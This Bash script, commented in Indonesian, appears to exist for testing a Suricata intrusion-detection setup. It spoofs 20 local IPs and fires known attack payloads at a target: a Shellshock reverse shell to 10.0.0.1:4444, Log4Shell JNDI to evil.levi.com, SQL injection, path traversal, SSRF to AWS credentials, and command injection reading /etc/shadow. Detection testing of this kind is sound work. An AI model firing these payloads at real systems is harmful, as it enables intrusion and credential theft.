#!/usr/bin/env bash
# =============================================================================
#  attack_sim.sh — Simulasi Serangan Multi-IP untuk Menguji Suricata
#  Author  : Levi (github.com/LEVI6957)
#  Usage   : sudo bash attack_sim.sh [TARGET_IP] [TARGET_PORT]
#
#  Skrip ini membuat IP virtual di interface jaringan utama,
#  lalu menyerang server target menggunakan berbagai jenis serangan
#  dari IP yang berbeda-beda agar terlihat seperti serangan dari
#  banyak peretas sekaligus.
# =============================================================================

# ── Warna ────────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

# ── Konfigurasi ───────────────────────────────────────────────────────────────
TARGET_IP="${1:-192.168.1.3}"
TARGET_PORT="${2:-8080}"
TARGET="http://${TARGET_IP}:${TARGET_PORT}"

# Deteksi interface jaringan utama secara otomatis
IFACE=$(ip -o -4 route show to default | awk '{print $5}' | head -n1)
if [[ -z "$IFACE" ]]; then
    IFACE="eth0"
fi

# Range IP virtual yang akan dibuat (192.168.1.50 - 192.168.1.69)
IP_BASE="192.168.1"
IP_START=50
IP_COUNT=20

# Delay antar serangan (detik) — ubah ke 0 untuk serangan kilat
DELAY=0.5

# ── Fungsi Helper ─────────────────────────────────────────────────────────────
info()    { echo -e "${GREEN}[INFO]${NC}  $*"; }
warn()    { echo -e "${YELLOW}[WARN]${NC}  $*"; }
attack()  { echo -e "${RED}[ATK]${NC}   $*"; }
success() { echo -e "${CYAN}[OK]${NC}    $*"; }
header()  { echo -e "\n${BOLD}${BLUE}══════════════════════════════════════════${NC}";
            echo -e "${BOLD}${BLUE}  $*${NC}";
            echo -e "${BOLD}${BLUE}══════════════════════════════════════════${NC}\n"; }

# ── Root Check ────────────────────────────────────────────────────────────────
[[ $EUID -ne 0 ]] && echo -e "${RED}[ERROR]${NC} Jalankan dengan sudo: sudo bash attack_sim.sh" && exit 1

# ── Cleanup saat EXIT ─────────────────────────────────────────────────────────
cleanup() {
    echo ""
    warn "Membersihkan IP virtual..."
    for i in $(seq $IP_START $((IP_START + IP_COUNT - 1))); do
        ip addr del "${IP_BASE}.${i}/24" dev "$IFACE" 2>/dev/null
    done
    success "Semua IP virtual dihapus. Bersih!"
}
trap cleanup EXIT

# ─────────────────────────────────────────────────────────────────────────────
header "🔥 SURICATA ATTACK SIMULATOR"
echo -e "  Target    : ${BOLD}${TARGET}${NC}"
echo -e "  Interface : ${BOLD}${IFACE}${NC}"
echo -e "  IP Range  : ${BOLD}${IP_BASE}.${IP_START} - ${IP_BASE}.$((IP_START + IP_COUNT - 1))${NC}"
echo -e "  Delay     : ${BOLD}${DELAY}s${NC}"
echo ""
warn "Pastikan IP target (${TARGET_IP}) TIDAK ada di Whitelist Dasbor agar bisa diblokir!"
echo ""
read -rp "$(echo -e ${YELLOW}[?]${NC}) Lanjut? (y/N): " confirm
[[ "${confirm,,}" != "y" ]] && echo "Dibatalkan." && exit 0

# ── Langkah 1: Buat IP Virtual ────────────────────────────────────────────────
header "1. Membuat IP Virtual"
for i in $(seq $IP_START $((IP_START + IP_COUNT - 1))); do
    ip addr add "${IP_BASE}.${i}/24" dev "$IFACE" 2>/dev/null
    success "IP virtual dibuat: ${IP_BASE}.${i}"
done

# Tunggu sebentar agar routing stabil
sleep 1

# ── Langkah 2: Eksekusi Serangan ─────────────────────────────────────────────
header "2. Memulai Simulasi Serangan"

run_attack() {
    local src_ip="$1"
    local desc="$2"
    local url="$3"
    local extra_args="${4:-}"

    attack "${desc} dari ${BOLD}${src_ip}${NC}"
    curl -s --max-time 3 --interface "$src_ip" $extra_args "$url" -o /dev/null 2>/dev/null
    sleep "$DELAY"
}

# IP 50 — SQL Injection Klasik
run_attack "${IP_BASE}.50" "SQL Injection (UNION)" \
    "${TARGET}/login?user=admin'+UNION+SELECT+1,2,3--"

# IP 51 — Shellshock (CVE-2014-6271)
run_attack "${IP_BASE}.51" "Shellshock via User-Agent" \
    "${TARGET}/" \
    "-H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"

# IP 52 — Log4Shell (CVE-2021-44228)
run_attack "${IP_BASE}.52" "Log4Shell via Header" \
    "${TARGET}/" \
    "-H 'X-Api-Version: \${jndi:ldap://evil.levi.com/exploit}'"

# IP 53 — Path Traversal (LFI)
run_attack "${IP_BASE}.53" "Path Traversal /etc/passwd" \
    "${TARGET}/../../../../etc/passwd"

# IP 54 — XSS Reflected
run_attack "${IP_BASE}.54" "Cross-Site Scripting (XSS)" \
    "${TARGET}/search?q=<script>alert(document.cookie)</script>"

# IP 55 — PHP RCE via CGI
run_attack "${IP_BASE}.55" "PHP CGI Remote Code Execution" \
    "${TARGET}/?-d+allow_url_include=1+-d+auto_prepend_file=php://input"

# IP 56 — Nikto Scanner
run_attack "${IP_BASE}.56" "Nikto Web Scanner" \
    "${TARGET}/" \
    "-A 'Nikto/2.1.6'"

# IP 57 — ZmEu Bot (phpMyAdmin Scanner)
run_attack "${IP_BASE}.57" "ZmEu Bot (phpMyAdmin)" \
    "${TARGET}/phpMyAdmin/index.php" \
    "-A 'ZmEu'"

# IP 58 — Blackmoon Botnet
run_attack "${IP_BASE}.58" "Blackmoon Botnet C2" \
    "${TARGET}/" \
    "-A 'blackmoon'"

# IP 59 — GPON Router Exploit
run_attack "${IP_BASE}.59" "GPON Router Exploit" \
    "${TARGET}/GponForm/diag_Form?images/"

# IP 60 — Apache Struts (CVE-2017-5638 / Equifax)
run_attack "${IP_BASE}.60" "Apache Struts RCE (Equifax)" \
    "${TARGET}/" \
    "-H 'Content-Type: %{(#_=\\'multipart/form-data\\').}'"

# IP 61 — Jboss/Java Deserialization
run_attack "${IP_BASE}.61" "JBoss Invoker Scan" \
    "${TARGET}/invoker/readonly"

# IP 62 — WordPress xmlrpc brute
run_attack "${IP_BASE}.62" "WordPress xmlrpc Exploit" \
    "${TARGET}/xmlrpc.php" \
    "-X POST -d '<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName></methodCall>'"

# IP 63 — AWS Metadata Steal (SSRF)
run_attack "${IP_BASE}.63" "SSRF (AWS Metadata)" \
    "${TARGET}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# IP 64 — Spring4Shell (CVE-2022-22965)
run_attack "${IP_BASE}.64" "Spring4Shell RCE" \
    "${TARGET}/" \
    "-H 'suffix: %>//'"

# IP 65 — SQL Injection via Cookie
run_attack "${IP_BASE}.65" "SQL Injection via Cookie" \
    "${TARGET}/" \
    "-H 'Cookie: session=1\\'OR\\'1\\'=\\'1'"

# IP 66 — Command Injection
run_attack "${IP_BASE}.66" "Command Injection" \
    "${TARGET}/?cmd=cat+/etc/shadow;id;whoami"

# IP 67 — Heartbleed (TLS scanner signature)
run_attack "${IP_BASE}.67" "Heartbleed Scanner" \
    "${TARGET}/" \
    "-A 'OpenSSL-Scanner/1.0 (Heartbleed-Test)'"

# IP 68 — Hydra/Brute force HTTP Auth
run_attack "${IP_BASE}.68" "HTTP Auth Brute Force (Hydra-style)" \
    "${TARGET}/admin" \
    "-u 'admin:password123'"

# IP 69 — DirBuster Scanner
run_attack "${IP_BASE}.69" "DirBuster Directory Scan" \
    "${TARGET}/admin/config.php" \
    "-A 'DirBuster-1.0-RC1'"

# ── Ringkasan ─────────────────────────────────────────────────────────────────
header "✅ Simulasi Selesai!"
echo -e "  ${BOLD}20 serangan${NC} dari ${BOLD}20 IP berbeda${NC} telah diluncurkan!"
echo ""
echo -e "  ${GREEN}➜${NC} Buka Dasbor: ${BOLD}http://${TARGET_IP}:${TARGET_PORT}${NC}"
echo -e "  ${GREEN}➜${NC} Lihat IP mana yang berhasil diblokir di tabel ${BOLD}IP Diblok${NC}"
echo -e "  ${GREEN}➜${NC} Cek notifikasi di Discord/Webhook-mu"
echo ""
